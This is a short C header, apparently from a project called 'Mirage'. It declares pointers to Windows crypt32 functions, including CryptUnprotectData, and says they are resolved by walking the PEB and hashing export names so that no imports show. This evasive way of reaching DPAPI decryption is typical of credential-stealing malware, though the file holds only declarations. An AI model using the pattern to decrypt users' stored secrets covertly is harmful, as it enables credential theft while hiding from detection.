/*
 * crypt32_peb.h — PEB-resolved Crypt32 API function pointers
 *
 * Shared singleton for CryptUnprotectData.
 * Resolves crypt32.dll via PEB-walk + hash-based export table parsing.
 */
#ifndef MIRAGE_CRYPT32_PEB_H
#define MIRAGE_CRYPT32_PEB_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

#if !defined(_WINCRYPT_H) && !defined(__WINCRYPT_H__)
typedef struct _CRYPTOAPI_BLOB {
    DWORD cbData;
    BYTE *pbData;
} DATA_BLOB, *PDATA_BLOB;
#endif

typedef BOOL (WINAPI *pCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *,
                                             PVOID, void *, DWORD, DATA_BLOB *);
typedef BOOL (WINAPI *pCertFreeCertificateContext)(const void *);

typedef struct {
    pCryptUnprotectData         pUnprotect;
    pCertFreeCertificateContext pCertFree;
    int ready;
} crypt32_api_t;

const crypt32_api_t *mirage_crypt32_api(void);

#ifdef ZIALFI_TEST_MODE
void mirage_crypt32_api_install(const crypt32_api_t *mock);
#endif

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_CRYPT32_PEB_H */
